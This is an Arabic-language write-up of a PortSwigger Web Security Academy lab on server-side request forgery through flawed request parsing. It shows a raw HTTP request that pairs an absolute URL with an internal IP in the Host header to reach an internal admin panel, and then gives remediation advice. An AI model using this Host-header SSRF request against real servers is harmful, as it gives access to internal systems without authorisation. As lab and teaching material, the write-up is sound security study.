# [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

## **`الهدف`**
قم بالوصول إلى لوحة الإدارة الداخلية الموجودة في نطاق `192.168.0.0/24` ثم قم بحذف حساب `carlos`.
## **`خطوات الحل`**
**`نفس خطوات حل لاب`** [Routing-based SSRF](./Routing-based-SSRF.md) بإختلاف بسيط وهو أن ترويسة `Host` يتم رفض الطلب إذا تم وضع الـ `IP` بها ولكن إذا تم تعديل الطلب وإضافة `absolute URL` بجانب الـ `HTTP METHOD` يتم قبول الـ `IP` داخل الـ `Host`.
```http
GET https://0a37005b03a6e9c582f315d800dc0047.web-security-academy.net/admin HTTP/2
Host: 192.168.0.215
Cookie: session=zQKTIDKVFR4iylwlxp9JoPztqdEIAT0t; _lab=47%7cMC0CFQCOwuwVAtMBfy0Y0WVAs46svn2kvwIUWOFG6v5lXfVHBi9EuIzLEErqNZBrTxfdOD4Xlv0GXyvEtcmHyBxTg6McoJQmi5gyre3Q87GLGLekvNdvq5Kv2RIMZ2A%2f1BK1ehJyTG6T10Aav3vrhJ9RoxGqgMdI7k79g3r76%2foDxu0O
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Host header authentication bypass](./Host-header-authentication-bypass.md)

ويجب التأكد من أن جميع الطبقات في بنية النظام `(WAF, Cache, Load Balancer, Backend)` تتحدث نفس اللغة وتفسر الطلبات بنفس الطريقة، وإذا احتوى الطلب على `Absolute URL` في سطر الـ `HTTP METHOD`، واحتوى أيضاً على ترويسة `Host`، يجب أن يتطابق الاثنان، وإذا كان هناك اختلاف بينهما يجب أن يرفض السيرفر الطلب فوراً بـ `400 Bad Request`.`

ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting`.
